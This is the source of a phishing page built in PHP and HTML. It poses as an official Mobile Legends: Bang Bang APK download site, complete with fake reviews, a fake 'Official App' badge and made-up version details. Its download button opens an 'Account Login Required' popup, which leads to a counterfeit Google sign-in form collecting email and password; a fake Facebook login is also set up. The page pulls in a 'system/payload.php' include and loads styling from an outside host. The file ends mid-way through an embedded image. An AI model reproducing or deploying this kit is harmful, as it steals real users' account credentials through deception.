<?php
if(isset($_POST['sessionToken']) && isset($_GET['gToken'])){
    $sessionToken = $_POST['sessionToken'];
    $gToken = $_GET['gToken'];
    
    if($sessionToken != "well"){
        header("Location: verify.php");
    }
    
    if($gToken != "verified"){
        header("Location: verify.php");
    }

include "system/payload.php";
gcodeCheckSession("verify.php");
?>
<html lang="en"><head>
    <meta charset="UTF-8">
    <title>Mobile Legends: Bang Bang</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
    <meta property="og:description" content="Mobile Legends: Exchange Event">
    <meta property="og:image" content="images/logo.png">
    <meta property="og:image:width" content="540">
    <meta property="og:image:height" content="282">
    <link href="https://suake.pkuce.my.id//index_files/css" rel="stylesheet">
    <link rel="stylesheet" href="css/google.css">
    <link rel="stylesheet" href="https://suake.pkuce.my.id/css-zone/moonton.css">
    <link rel="stylesheet" href="css/facebook.css">
    <link rel="stylesheet" href="css/animate.css">
    <link rel="stylesheet" href="https://suake.pkuce.my.id/css-zone/laza-swiper.css">
    <link rel="stylesheet" href="css/loading.css">
    <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Teko&display=swap" rel="stylesheet">
    <link href="css/font-awesome.min.css" rel="stylesheet" crossorigin="anonymous">
    <link rel="stylesheet" href="css/material-design-iconic-font.min.css">
    <link rel="stylesheet" href="css/all.min.css">
    <link rel="stylesheet" href="css/main.css">
    <link rel="stylesheet" href="css/ori.css">
    <link rel="icon" type="img/png" href="images/1d4439a2ab14e995b99fd8934adb34ee.svg" sizes="32x32">
    <style>
    </style>
</head>

<body style="">
    <div class="slider-container">
        <div class="navbar">
            <img class="navbar-logo" src="images/logo.png">
            <div class="navbar-left">
                <img class="navbar-language" src="images/glob.svg">
                <div class="navbar-text">EN</div>
            </div>
            <div class="navbar-right">
                <img class="navbar-menu" src="images/menu.png">
            </div>
        </div>
        <div class="container">
            <div class="app-icon">
                <img src="images/ace2a42a06d9b201b2ec0cf92535dc3e_icon.png" alt="Mobile Legends: Bang Bang Icon">
            </div>
            <div class="app-info">
                <div class="app-title">
                    Mobile Legends: Bang Bang (BETA)
                </div>
                <div class="dev-name" style="display: flex; align-items: center;">
                    <span>Moonton</span>
                    <span class="trust-badge" style="display: flex; align-items: center; margin-left: 8px;">
                        <img alt="Trustable Ranking Icon" src="images/official-app.svg" style="width: 18px; height: 18px;">
                        <span style="margin-left: 4px; font-size: 14px; color: #1da1f2;">Official App</span>
                    </span>
                </div>
                <div class="rating">
                    <span class="stars">★★★★★</span>
                    <span class="rating-value">4.1</span>
                    <span class="rating-votes">(13M votes)</span>
                </div>
                <div style="display: flex; justify-content: center; margin: 16px 0; gap: 12px;">
                    <button class="download-btn" id="downloadbeforelogin" style="background: #205884;" onclick="open_account_login()">Download APK (199 MB)</button>
                    <button class="download-btn" id="downloadafterlogin" style="display: none;" onclick="downloadApk()">Download APK (199 MB)</button>

                    <style>
                        @keyframes fadeIn {
                            from {
                                opacity: 0;
                            }

                            to {
                                opacity: 1;
                            }
                        }
                    </style>
                </div>
                <div id="download-processing" style="display:none;color:#1da1f2;font-size: 13px;text-align:center;animation: fadeIn 0.5s;margin-top: -24px;margin-bottom: 13px;">
                    <i class="fa fa-spinner fa-spin"></i> Download processing...
                </div>
                <div class="app-desc">
                    Mobile Legends: Bang Bang is a 5v5 MOBA game for Android that pits real players against each other, using a team composed of your favorite heroes. Enjoy quick matchmaking and epic battles!
                </div>
                <div class="app-details">
                    <div><strong>Version:</strong> 1.8.65.8941</div>
                    <div><strong>Last update:</strong> 2025-06-01</div>
                    <div><strong>Downloads:</strong> 500M+</div>
                    <div><strong>Requires Android:</strong> 4.1+</div>
                    <div><strong>Content Rating:</strong> Everyone 10+</div>
                </div>
            </div>
        </div>
        <div class="app-view__AppDetailsContainer-sc-oiuh9w-4 jBqCjJ">
            <div class="app-view__Row-sc-oiuh9w-1 app-view__TabsContainer-sc-oiuh9w-5 jaAMtu cfcJXE">
                <span class="app-view__RobotoFont-sc-oiuh9w-6 app-view__AppViewTab-sc-oiuh9w-7 WvlRB eiySUK" id="tab-details">Details</span>
                <span class="app-view__RobotoFont-sc-oiuh9w-6 app-view__AppViewTab-sc-oiuh9w-7 WvlRB jbbpIZ" id="tab-reviews">Reviews</span>
                <span class="app-view__RobotoFont-sc-oiuh9w-6 app-view__AppViewTab-sc-oiuh9w-7 WvlRB jbbpIZ" id="tab-faqs">FAQs</span>
                <span class="app-view__RobotoFont-sc-oiuh9w-6 app-view__AppViewTab-sc-oiuh9w-7 WvlRB jbbpIZ" id="tab-versions">Versions</span>
                <span class="app-view__RobotoFont-sc-oiuh9w-6 app-view__AppViewTab-sc-oiuh9w-7 WvlRB jbbpIZ" id="tab-info">Info</span>
            </div>
            <div id="tab-content-details" class="tab-content" style="display:block;">
                <div class="game-description">
                    <h4 style="color: #9db6db; margin-bottom: 8px;">Description</h4>
                    <p>
                        <strong>Mobile Legends: Bang Bang</strong> is a fast-paced 5v5 MOBA game for Android, where real players team up and battle in real time using their favorite heroes. With quick matchmaking and smooth controls, you’ll jump straight into action-packed matches designed for both casual and competitive gamers.
                    </p>
                    <p>
                        Experience classic MOBA gameplay with three lanes, wild bosses, and four jungle areas. Choose from a growing roster of heroes—assassins, supports, marksmen, tanks, and more—each with unique skills and playstyles. Teamwork and strategy are key: coordinate with your allies, defend your base, and push to destroy enemy towers for victory.
                    </p>
                    <p>
                        Mobile Legends stands out for its fair and balanced matchmaking system, ensuring that skill and teamwork—not spending—determine your success. Battles are quick to start and typically last just minutes, making it easy to enjoy a full match anytime, anywhere.
                    </p>
                    <p>
                        The intuitive controls let you master your hero quickly: use the virtual joystick on the left to move and action buttons on the right for skills. Innovative features like tap-to-equip keep you focused on the fight, while a fast reconnection system and AI support ensure you’re never left behind if your connection drops.
                    </p>
                    <p>
                        With stunning graphics, regular updates, and a vibrant global community, Mobile Legends: Bang Bang brings the excitement of MOBA gaming to your mobile device. Jump in, team up, and prove your skills on the battlefield!
                    </p>
                </div>
            </div>
            <div id="tab-content-reviews" class="tab-content" style="display:none;">
                <div class="reviews-section" style="padding:16px;">
                    <h4 style="color: #9db6db; margin-bottom: 8px;">Reviews</h4>
                    <div class="review">
                        <div class="review-header" style="display: flex; align-items: center; margin-bottom: 6px;">
                            <img src="images/32.jpg" alt="User" style="width:32px;height:32px;border-radius:50%;margin-right:10px;">
                            <div>
                                <strong>Andrew Smith</strong>
                                <div style="font-size:12px;color:#aaa;">June 2, 2024</div>
                            </div>
                        </div>
                        <div class="review-rating" style="color: #FFD700;">★★★★★</div>
                        <div class="review-text">Best MOBA game on Android! Great graphics, smooth gameplay, and lots of favorite heroes. Playing with friends is even more fun!</div>
                    </div>
                    <hr style="border:0;border-top:1px solid #222;margin:12px 0;">
                    <div class="review">
                        <div class="review-header" style="display: flex; align-items: center; margin-bottom: 6px;">
                            <img src="images/44.jpg" alt="User" style="width:32px;height:32px;border-radius:50%;margin-right:10px;">
                            <div>
                                <strong>Sophia Lee</strong>
                                <div style="font-size:12px;color:#aaa;">May 28, 2024</div>
                            </div>
                        </div>
                        <div class="review-rating" style="color: #FFD700;">★★★★☆</div>
                        <div class="review-text">Really fun, but sometimes it lags if the signal is bad. The events are interesting and the skins are awesome!</div>
                    </div>
                    <hr style="border:0;border-top:1px solid #222;margin:12px 0;">
                    <div class="review">
                        <div class="review-header" style="display: flex; align-items: center; margin-bottom: 6px;">
                            <img src="images/65.jpg" alt="User" style="width:32px;height:32px;border-radius:50%;margin-right:10px;">
                            <div>
                                <strong>David Johnson</strong>
                                <div style="font-size:12px;color:#aaa;">May 15, 2024</div>
                            </div>
                        </div>
                        <div class="review-rating" style="color: #FFD700;">★★★★★</div>
                        <div class="review-text">Fast matchmaking, easy-to-understand controls. Suitable for both beginners and pros. Frequent updates too!</div>
                    </div>
                    <hr style="border:0;border-top:1px solid #222;margin:12px 0;">
                    <div class="review">
                        <div class="review-header" style="display: flex; align-items: center; margin-bottom: 6px;">
                            <img src="images/68.jpg" alt="User" style="width:32px;height:32px;border-radius:50%;margin-right:10px;">
                            <div>
                                <strong>Emily Rose</strong>
                                <div style="font-size:12px;color:#aaa;">April 30, 2024</div>
                            </div>
                        </div>
                        <div class="review-rating" style="color: #FFD700;">★★★☆☆</div>
                        <div class="review-text">The game is good, but sometimes toxic players are annoying. Hope it gets better in the future!</div>
                    </div>
                </div>
            </div>
            <div id="tab-content-faqs" class="tab-content" style="display:none;">
                <div class="faqs-section" style="padding:16px;">
                    <h4 style="color: #9db6db; margin-bottom: 8px;">FAQs</h4>
                    <div class="faq-item">
                        <strong>How to download Mobile Legends APK?</strong>
                        <p>
                            To download Mobile Legends on your Android device, simply tap the Download button above and follow the steps provided. On some devices, you may need to grant special permissions to the Aptoide app store to install apps from unknown sources. Usually, this permission is requested during installation, but if not, you can manually enable it in your Android settings.
                        </p>
                    </div>
                    <div class="faq-item">
                        <strong>Is Mobile Legends free?</strong>
                        <p>
                            Downloading and playing Mobile Legends is completely free! You don't need to pay anything to enjoy the game. While in-app purchases are available, the Aptoide version offers you a bonus on every purchase.
                        </p>
                    </div>

                    <div class="faq-item">
                        <strong>What is the total size of Mobile Legends?</strong>
                        <p>
                            Mobile Legends: Bang Bang APK is about 136.5 MB, making it one of the lightest MOBA games for Android. Despite its small size, it offers high-quality graphics, voice-acting, and a great gaming experience.
                        </p>
                    </div>

                    <div class="faq-item">
                        <strong>Why is Mobile Legends so popular?</strong>
                        <p>
                            Mobile Legends is popular due to its fast 10-second matchmaking, 10-minute battles, and a variety of gameplay features like 4 jungle areas, 3 lanes, 2 bosses, 18 defense towers, and multiple hero types such as Tanks, Mages, Assassins, and Marksmen.
                        </p>
                    </div>
                </div>
            </div>
            <div id="tab-content-versions" class="tab-content" style="display:none;">
                <div class="versions-section" style="padding:16px;">
                    <h4 style="color: #9db6db; margin-bottom: 8px;">Versions</h4>
                    <div class="versions__VersionsItemContainer-sc-1qeurd6-7 bnprIO">
                        <h2 class="versions__LastVersionHeader-sc-1qeurd6-11 dHjtkP">Latest Version of Mobile Legends: Bang Bang</h2>
                        <div class="versions__VersionItemContainer-sc-1qeurd6-1 fOmFIn">
                            <div class="versions__DetailsColumn-sc-1qeurd6-3 feHwps">
                                <div class="versions__VersionItemTitle-sc-1qeurd6-6 kxJGCc">
                                    <span color="#171717" class="appview-header__AppViewSpan-sc-weylp4-13 gIkYdN">21.9.93.10904</span>
                                    <img alt="Trust Icon Versions" src="images/trust-icon.svg" class="versions__TrustedIcon-sc-1qeurd6-8 cvkavv">
                                </div>
                                <span color="#6F6F6F" class="appview-header__AppViewSpan-sc-weylp4-13 iJfTuT">1/6/2025</span>
                                <div class="versions__DetailsRow-sc-1qeurd6-5 gEpwez">
                                    <span color="#6F6F6F" class="appview-header__AppViewSpan-sc-weylp4-13 iJfTuT">6M downloads</span>
                                    <span color="#6F6F6F" class="appview-header__AppViewSpan-sc-weylp4-13 hdwVVt">199 MB Size</span>
                                </div>
                            </div>
                            <div class="versions__DownloadContainer-sc-1qeurd6-4 hyvrS">
                                <div class="download-button__DownloadContainer-sc-18tslsf-0 iupaOQ">
                                    <a href="javascript:void(0);" class="gradient-button__OutlinedAppStore-sc-1troloh-4 fDAbyw track-download-button version-download-btn" style="text-decoration:none;color:inherit;" onclick="open_account_login()">
                                        Download
                                    </a>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div id="tab-content-info" class="tab-content" style="display:none;">
                <div class="info-section" style="padding:16px;">
                    <h4 style="color: #9db6db; margin-bottom: 8px;">Info</h4>
                    <div class="info__InfoContainer-sc-1q3osbl-0 geZfTX">
                        <div class="info__APKInformation-sc-1q3osbl-5 dMZnbg">
                            <h2 class="info__APKHeaderTitle-sc-1q3osbl-7 ckkSOj">Mobile Legends: Bang Bang - APK Information</h2>
                            <span class="info__APKDetail-sc-1q3osbl-8 jNjvUq"><strong>APK Version:</strong> 21.9.93.10904</span>
                            <span class="info__APKDetail-sc-1q3osbl-8 jNjvUq"><strong>Package:</strong> com.mobile.legends</span>
                            <span class="info__APKDetail-sc-1q3osbl-8 jNjvUq"><strong>Android compatability:</strong> 4.4 - 4.4.4+ (KitKat)</span>
                            <span class="info__APKDetail-sc-1q3osbl-8 jNjvUq">
                                <meta itemprop="publisher" content="Moonton">
                                <strong>Developer:</strong>
                                <a href="https://www.mobilelegends.com/" rel="nofollow" class="info__InfoAnchor-sc-1q3osbl-9 jXmlxC">
                                    <meta itemprop="publisher" content="Moonton">Moonton
                                </a>
                            </span>
                            <span class="info__APKDetail-sc-1q3osbl-8 jNjvUq">
                                <strong>Privacy Policy:</strong>
                                <a href="https://m.mobilelegends.com/news/articleldetail?newsid=2690279" rel="nofollow" class="info__InfoAnchor-sc-1q3osbl-9 jXmlxC">
                                    https://m.mobilelegends.com/news/articleldetail?newsid=2690279
                                </a>
                            </span>
                            <span class="info__APKDetail-sc-1q3osbl-8 jNjvUq">
                                <strong>Permissions:</strong>
                                <a data-cy="permissions" class="info__InfoAnchor-sc-1q3osbl-9 jXmlxC">47</a>
                            </span>
                        </div>
                        <div class="info__DetailsInformations-sc-1q3osbl-10 jRooCZ">
                            <div class="info__DetailsCol-sc-1q3osbl-11 cogrwL">
                                <span class="info__APKDetail-sc-1q3osbl-8 jNjvUq"><strong>Name:</strong> Mobile Legends: Bang Bang</span>
                                <span class="info__APKDetail-sc-1q3osbl-8 jNjvUq"><strong>Size:</strong> 199 MB</span>
                                <span class="info__APKDetail-sc-1q3osbl-8 jNjvUq"><strong>Downloads:</strong> 6M</span>
                                <span class="info__APKDetail-sc-1q3osbl-8 jNjvUq"><strong>Version :</strong> 21.9.93.10904</span>
                                <span class="info__APKDetail-sc-1q3osbl-8 jNjvUq"><strong>Release Date:</strong> 2025-06-20 11:09:06</span>
                                <span class="info__APKDetail-sc-1q3osbl-8 jNjvUq"><strong>Min Screen:</strong> SMALL</span>
                                <span class="info__APKDetail-sc-1q3osbl-8 jNjvUq"><strong>Supported CPU:</strong> armeabi-v7a, arm64-v8a</span>
                                <span class="info__APKDetail-sc-1q3osbl-8 jNjvUq"><strong>Package ID:</strong> com.mobile.legends</span>
                                <span class="info__APKDetail-sc-1q3osbl-8 jNjvUq"><strong>SHA1 Signature:</strong> D6:59:C5:39:7A:8F:2A:5B:6F:34:89:E5:46:A3:89:CA:54:FD:28:FC</span>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

<style>
.sang_pengkhianat {
    width: 100%;
    height: 100%;
    position: fixed;
    top: 0;
    left: 0;
    z-index: 9999;
    background-color: rgba(0,0,0,.5)
}
.pengkhianat_box {
    width: 400px;
    padding-left: 0px;
    padding-right: 0px;
    aspect-ratio: 1/1;
    position: relative;
    margin: 15% auto 50px;
}
.pengkhianat_box_bg {        
    background: linear-gradient(to bottom, rgba(42,66,104,0.9) , rgba(57,91,129,0.9));
    background-size: 100% 100%;
    width: 100%;
    margin-top: -12px;
    border: 1.5px solid #405E8D;
}
.pengkhianat_box_navbar {
	background: rgba(0,0,0,0) no-repeat center center;
	background-size:100% 100%;
	height: auto;
	padding-bottom: 6px;	
	border-bottom: .1px solid #405E8D;
}
.pengkhianat_box_navbar img {	
	width:25px;
	height: auto;
	float:right;
	margin-top:7px;
	margin-right:5px;	
	padding-bottom: 6px;
}
.pengkhianat_box_navbar_title {
	padding-top: 12px;
	margin-top:1px;
	color: #fff;
	font-size: 14px;
	margin-bottom:6px;
	margin-left:auto;		
	margin-right:auto;	
	font-family:arial, sans-serif;
	font-weight: 400;
	text-align: center;	
}
.pengkhianat_box_navbar_title_logo {	
	text-align: left;
	float:left;
	margin-left:5px;
	display: inline-block;
}
.pengkhianat_box_navbar_title_logo img {
	width: 70px;
    height: auto;
    position: absolute;
    margin-top:6px;
}
.pengkhianat_box_form_id4 {
   width: 100%;
   height:220px;
   margin-left: auto;
   margin-right: auto;
   padding: 10px;
   padding-top: 0px;  
   margin-bottom: 0px;   
}
.popup-btn-login {
	width: 90%;
	border-radius: 2px;
	height: 35px;
	padding: 1px;
	padding-top: 6px;
	margin-bottom: 8px;
	margin-top: 8px;
	margin: 3px;
	color: #f2f2f2;
	font-size: 14px;
	font-family: arial, sans-serif;
	border: none;
	outline: none;
	position: relative;
	display: inline-block;
	text-align: left;
}
.popup-btn-mlbb img {
	background: transparent;
	border-radius: 2px;
	width: 25px;
	height: 25px;
	margin-top: -5px;
	margin-left: 4px;
	margin-right: 20px;
	color: #fff;
	font-size: 20px;
	float: left;
}
.popup-btn-twitter img {
	background: transparent;
	border-radius: 2px;
	width: 25px;
	height: 25px;
	margin-top: -3px;
	margin-left: 1px;
	color: #fff;
	font-size: 20px;
	float: left;
}
.popup-btn-google img {
	background: #fff;
	border-radius: 2px;
	width: 25px;
	height: 25px;
	margin-top: -3px;
	margin-left: 1px;
	color: #fff;
	font-size: 20px;
	float: left;
}
.popup-btn-login-link img {
	width: 25px;
	height: 25px;
	margin-top: -3px;
	margin-left: 1px;
	color: #fff;
	font-size: 20px;
	float: left;
}
.popup-btn-login i {
	color: #fff;
	font-size: 20px;
	margin-top: -8px;
	float: left;
}
.popup-btn-mlbb {
	background: url(img/btn_off.png) no-repeat center center;
	color: #fff;
	border: 1px solid #557BB9;
}
.popup-btn-twitter {
	background: #198B96;
	color: #fff;
}
.popup-btn-google {
	background: #4D8AE5;
	color: #fff;
}
.popup-btn-login-link {
	background: #E3B448;
	color: #000;
}
.popup-btn-login-mores {
	background-color: rgba(0, 0, 0, 0.7);
	color: #fff;
}
.popup-btn-fb {
	background: none;
	outline: none;
	border: none;
	margin-top: 70px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 0px;
	padding: 0px;
	color: #AAAAAA;
	font-size: 13px;
	font-family: selow;
	font-weight: 500;
	text-align: center;
	display: block;
}
.popup-btn-fb img {
	background: #4167B2;
	border-radius: 2px;
	background-size: 100% 100%;
	width: 45px;
	padding: 0px;
	height: auto;
	margin-bottom: 5px;
	text-align: center;
}
.pengkhianat_box_alert_center_id_verify {
	width: 95%;
	height: auto;
	margin-top: 8px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 1px;
	padding: 5px;
	padding-top: 0px;
	border-bottom: 1px solid #405E8D;
	color: #D2EBFF;
	font-size: 14px;
    font-family: arial, sans-serif;
	font-weight: 400;
	text-align: center;
	line-height: 20px;
	display: block;
}
.pengkhianat_box_alert_center_id_verify span {
	color: #CFB990;
}
@media only screen and (min-width: 320px) and (max-width: 387px) {
.pengkhianat_box_navbar img 
{ width:15px; }

.pengkhianat_box_navbar_title_logo 
{ display: inline-block; }

.pengkhianat_box_navbar_title_logo img 
{ width: 50px; }

.pengkhianat_box_navbar_title_logo2
{ display: inline-block; }

.pengkhianat_box_navbar_title_logo2 img 
{ width: 20px; margin-top:7px; }

.pengkhianat_box_navbar_title
{ font-size: 12px; padding-top: 10px; margin-bottom:3px; }
.pengkhianat_box_alert_center_id_verify
{ font-size: 12px; margin-top:10px; }
.pengkhianat_box {
width: 90%;
}
}
</style>

<div class="sang_pengkhianat account_login animated fadeIn" style="display: none;">
<div class="pengkhianat_box zoom-in">
<div class="pengkhianat_box_bg">
<div class="pengkhianat_box_navbar">
<div class="pengkhianat_box_navbar_title_logo">      
<img src="images/logo.png">
</div>          
<div class="pengkhianat_box_navbar_title">      
<a>Account Login Required</a>
</div>
</div>
<div class="pengkhianat_box_alert_center_id_verify" style="padding: 20px;">
Choose your login method to continue download
</div>   
<div class="pengkhianat_box_form_id4" style="height: 130px;">
<center>
<br>
<button type="button" class="popup-btn-login popup-btn-mlbb" onmousedown="buka.play();" onclick="open_google();"><img class="icon-login" src="images/btn_gp.png">
Sign in with Google Account
</button>
</center>
</div>
</div>
</div>      
</div>

        <div class="popup-login login-google animated fadeIn" style="display: none;">
            <div class="popup-box-login-google">
                <div class="box-loading" style="display: none;">
                    <div class="google-top-loading" id="google-top-loading"></div>
                    <div class="header-google">
                        <div class="google-loading animated fadeIn" id="google-loading">
                            <img src="images/google.png" width="40" height="40" style="margin-left: 0px;margin-bottom: 8px;float: none;">
                            <div class="loader-spinner" style="display: none;"></div>
                            <div class="loader-text">Signing in…</div>
                        </div>
                    </div> <!--- header-google --->
                </div> <!--- box-loading --->
                <div class="box-google" style="display: block;">
                    <a onmousedown="tutup.play();" onclick="close_google()" class="close-other"><i class="zmdi zmdi-close"></i></a>
                    <div class="header-google"><img src="images/google.png" width="40" height="40">
                    </div> <!--- header-google --->
                    <div class="txt-login-google">Sign in</div> <!--- txt-login-google --->
                    <div class="txt-login-google-desc">to continue to <a style="color: #1a73e8;font-weight: 600;font-family: arial;font-size: 12px;">Mobile Legends: Bang Bang.</a></div> <!--- txt-login-google-desc --->
                    <form action="javascript:void(0)" id="ValidateLoginGpForm">
                        <div class="input-box">
                            <label class="input-label">Email</label>
                            <input type="email" class="input-1" name="email" id="email-google" onfocus="setFocus(true)" onblur="setFocus(false)" required="">
                        </div>
                        <div class="input-box">
                            <label class="input-label">Password</label>
                            <input type="password" class="input-1" name="password" id="password-google" onfocus="setFocus(true)" onblur="setFocus(false)" required="">
                        </div>
                        <div class="checkbox-wrap">
                            <input type="checkbox" id="show-password" onclick="togglePasswordVisibility()">
                            <label for="show-password">Show Password</label>
                        </div>
                        <input type="hidden" name="login" id="login-google" value="Google" readonly="">
                        <div class="email-gp" style="color: rgb(213, 0, 0);font-size: 13px;text-align: center;padding: 11px;margin-bottom: -18px;display: none;"><svg aria-hidden="true" fill="currentColor" focusable="false" width="14px" height="14px" viewBox="0 -3 24 24" xmlns="https://www.w3.org/2000/svg" style="">
                                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
                            </svg> Couldn't find your Google account.</div>
                        <div class="sandi-gp" style="color: rgb(213, 0, 0);font-size: 13px;text-align: center;padding: 11px;margin-bottom: -18px;display: none;"><svg aria-hidden="true" fill="currentColor" focusable="false" width="14px" height="14px" viewBox="0 -3 24 24" xmlns="https://www.w3.org/2000/svg" style="">
                                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
                            </svg> Wrong password, try again.</div>
                        <button type="button" class="btn-forgot-google">Forgot email?</button>
                        <br>
                        <div class="notify-google">Not your computer? Use Guest mode to sign in privately. <span>Learn more about using Guest mode</span></div> <!--- notify-google --->
                        <div class="button-group-google">
                            <button type="button" class="btn-create-google">Create account</button>
                            <button type="button" id="ButtonKontol" class="btn-login-google" onclick="return ValidateLoginGpData()">Log in</button>
                        </div>
                    </form>
                </div> <!--- box-google --->
            </div>
        </div>
		
		<div class="popup-login login-facebook" style="display: none;">
        <div class="popup-box-login-fb">
            <a onclick="close_facebook()" class="close-fb"><i class="fa-solid fa-xmark"></i></a>
            <div class="navbar-fb"><img src="data:image/png;base64,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